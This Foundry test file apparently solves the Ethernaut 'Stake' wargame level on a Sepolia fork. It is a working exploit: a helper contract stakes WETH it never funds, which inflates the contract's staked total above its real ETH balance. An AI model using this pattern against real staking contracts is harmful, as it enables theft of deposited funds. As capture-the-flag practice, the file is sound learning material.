// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {Stake} from "../src/ethernaut/Stake.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract StakeAttack {
    address stake;
    constructor(address stake_) {
        stake = stake_;
    }

    function attack() public payable {
        uint256 amount = msg.value;
        require(amount >= 1e15, "");
        Stake(stake).StakeETH{value: amount}();
        IERC20(Stake(stake).WETH()).approve(stake, type(uint256).max);
        Stake(stake).StakeWETH(amount);
    }
}

contract StakeAttacker is Test {
    address constant stake = 0xD92FC03969c01Fa9ce38914aCA1766224BB74C5C;
    uint256 constant blockNumber = 6355566;
    address constant alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;

    address constant weth = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;

    function setUp() public {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );
    }

    function testAttack() public {
        _attack();

        assertGt(stake.balance, 0);

        assertGt(Stake(stake).totalStaked(), stake.balance);

        assertEq(Stake(stake).UserStake(alice), 0);
        assertEq(Stake(stake).Stakers(alice), true);
    }

    function _attack() internal {
        uint256 amount = 1e15 + 1;
        vm.startPrank(alice);
        Stake(stake).StakeETH{value: amount}();
        Stake(stake).Unstake(amount);

        StakeAttack attack = new StakeAttack(stake);
        attack.attack{value: 1e15 + 1}();

        vm.stopPrank();
    }
}

// forge test --match-contract StakeAttacker -vvv
